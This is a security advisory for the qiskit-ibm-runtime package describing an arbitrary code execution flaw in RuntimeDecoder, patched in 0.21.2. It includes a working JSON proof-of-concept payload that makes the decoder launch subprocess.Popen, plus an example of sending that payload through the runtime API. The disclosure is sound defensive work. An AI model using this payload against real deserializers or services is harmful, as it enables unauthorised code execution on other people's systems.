# `qiskit\_ibm\_runtime.RuntimeDecoder` can execute arbitrary code

Moderate

## Package

pip

qiskit-ibm-runtime
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>=0.1.0

## Patched versions

0.21.2

## Description

### Summary

deserializing json data using `qiskit_ibm_runtime.RuntimeDecoder` can be made to execute arbitrary code given a correctly formatted input string

### Details

`RuntimeDecoder` is supposed to be able to deserialize JSON strings containing various special types encoded via `RuntimeEncoder`. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code:

[qiskit-ibm-runtime/qiskit\_ibm\_runtime/utils/json.py](https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159)

Lines 156 to 159
in
[16e90f4](/Qiskit/qiskit-ibm-runtime/commit/16e90f475e78a9d2ae77daa139ef750cfa84ca82)

|  | mod = importlib.import\_module(mod\_name) |
| --- | --- |
|  | for name, clz in inspect.getmembers(mod, inspect.isclass): |
|  | if name == class\_name: |
|  | return clz(\*\*settings) |

### PoC

```
malicious_data = {
    "__type__": "settings",
    "__module__": "subprocess",
    "__class__": "Popen",
    "__value__": {
        "args": ["echo", "hi"]
    },
}
json_str = json.dumps(malicious_data)

_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
```

(where obviously "echo hi" can be replaced with something much more malicious)

notably the following also makes it through the runtime API, with `malicious_data` serialized client-side via `RuntimeEncoder` (and therefore presumably deserialized server-side via `RuntimeDecoder`?)

```
service = qiskit_ibm_runtime(<ibm_cloud_credentials>)
job = service.run("qasm3-runner", malicious_data)
print(job.status())  # prints "JobStatus.QUEUED"
```
### Impact

i don't know if `qiskit_ibm_runtime.RuntimeDecoder` is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
